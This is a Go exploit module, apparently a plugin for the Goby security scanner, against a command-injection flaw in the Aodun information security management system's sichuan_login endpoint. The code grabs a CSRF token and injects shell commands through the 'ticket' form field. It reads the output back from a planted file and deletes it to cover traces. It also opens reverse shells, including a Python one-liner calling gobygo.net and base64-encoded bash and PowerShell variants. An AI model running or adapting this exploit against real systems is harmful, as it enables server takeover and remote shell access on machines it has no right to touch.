package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Aodun-Info-Security-MS /sichuan_login Command Execution Vulnerability",
    "Description": "<p>Aodun Software is a brand of Beijing Aodun Software Co., Ltd., a high-tech enterprise registered in Zhongguancun Software Park. Since its establishment in 2005, it has been working in the field of network and information security.</p><p>There is a command execution vulnerability in the information security management system of Aopun, through which an attacker can execute commands arbitrarily on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Aodun-Info-Security-MS",
    "Homepage": "https://www.aodun.com.cn/",
    "DisclosureDate": "2024-05-15",
    "PostTime": "2024-09-25",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": " body=\"aodun/aodun.js\" && body=\"aodun/aodun.function.js\"",
    "GobyQuery": " body=\"aodun/aodun.js\" && body=\"aodun/aodun.function.js\"",
    "Level": "2",
    "Impact": "<p>There is a command execution vulnerability in the information security management system of Aopun, through which an attacker can execute commands arbitrarily on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/adysec/nuclei_poc/blob/4815f8becba3eccffa183087e84ed056cd05bab6/poc/auth/aodun-sichuan-login-rce.yaml"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash,BySh",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "傲盾信息安全管理系统 /sichuan_login 命令执行漏洞",
            "Product": "傲盾-信息安全管理系统",
            "Description": "<p>傲盾软件是北京傲盾软件有限责任公司旗下的品牌，注册于中关村软件园区的高新技术企业。自2005年成立以来，一直在网络和信息安全领域耕耘。<br></p><p>傲盾信息安全管理系统存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>傲盾信息安全管理系统存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Aodun-Info-Security-MS /sichuan_login Command Execution Vulnerability",
            "Product": "Aodun-Info-Security-MS",
            "Description": "<p>Aodun Software is a brand of Beijing Aodun Software Co., Ltd., a high-tech enterprise registered in Zhongguancun Software Park. Since its establishment in 2005, it has been working in the field of network and information security.</p><p>There is a command execution vulnerability in the information security management system of Aopun, through which an attacker can execute commands arbitrarily on the server side, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is a command execution vulnerability in the information security management system of Aopun, through which an attacker can execute commands arbitrarily on the server side, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9957"
}`
	setPayloadRequestHash_sadfnkhfyuiahsyuilfhcauisfghyiashjcasyksgfhsiejdufgykhssdfybnsdtyuofg := func(hostInfo *httpclient.FixUrl, command string, echo bool) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		requestConfig := httpclient.NewGetRequestConfig("/ispirit/login_code.php")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			return "", "", errors.New("failed to RCE")
		}
		header := resp.HeaderString.String()
		re, err := regexp.Compile(`csrftoken=((.|\n)*?);`)
		if err != nil {
			return "", "", errors.New("failed to RCE")
		}
		//检查是否有匹配到内容
		if !re.MatchString(header) {
			return "", "", errors.New("failed to RCE")
		}
		match := re.FindStringSubmatch(header)
		csrftoken := match[1]
		//漏洞url地址
		vulURL := "/user_management/sichuan_login"
		requestConfig = httpclient.NewPostRequestConfig(vulURL)
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.Header.Store("Cookie", "csrftoken="+csrftoken+";")
		requestConfig.Header.Store("X-Csrftoken", csrftoken)
		requestConfig.FollowRedirect = false
		tmpFileName := ""
		//对command进行url编码
		command = url.QueryEscape(command)
		if echo == true {
			tmpFileName = goutils.RandomHexString(6) + ".txt"
			command = command + ` > /adm/isms_web/static/base_static/js/aodun/` + tmpFileName
		}
		payload := "loginname=sysadmin&ticket=|" + command
		requestConfig.Data = payload
		resp, err = httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			return "", "", errors.New("failed to RCE")
		}
		commandResult := ""
		if echo == true {
			GetrequestConfig := httpclient.NewGetRequestConfig("/static/base_static/js/aodun/" + tmpFileName)
			GetrequestConfig.VerifyTls = false
			GetrequestConfig.FollowRedirect = false
			Getresp, err := httpclient.DoHttpRequest(hostInfo, GetrequestConfig)
			if err != nil || Getresp.StatusCode != 200 {
				payload = "loginname=sysadmin&ticket=|rm " + `/adm/isms_web/static/base_static/js/aodun/` + tmpFileName
				requestConfig.Data = payload
				httpclient.DoHttpRequest(hostInfo, requestConfig)
				return "", vulURL, errors.New("failed to read file")
			}
			commandResult = Getresp.RawBody
			//清理痕迹
			payload = "loginname=sysadmin&ticket=|rm " + `/adm/isms_web/static/base_static/js/aodun/` + tmpFileName
			requestConfig.Data = payload
			httpclient.DoHttpRequest(hostInfo, requestConfig)
			err = nil
			return commandResult, vulURL, err
		}
		err = nil
		return commandResult, vulURL, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_sadfnkhfyuiahsyuilfhcauisfghyiashjcasyksgfhsiejdufgykhssdfybnsdtyuofg

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand, true)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash_sadfnkhfyuiahsyuilfhcauisfghyiashjcasyksgfhsiejdufgykhssdfybnsdtyuofg

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command, true)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command, false)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
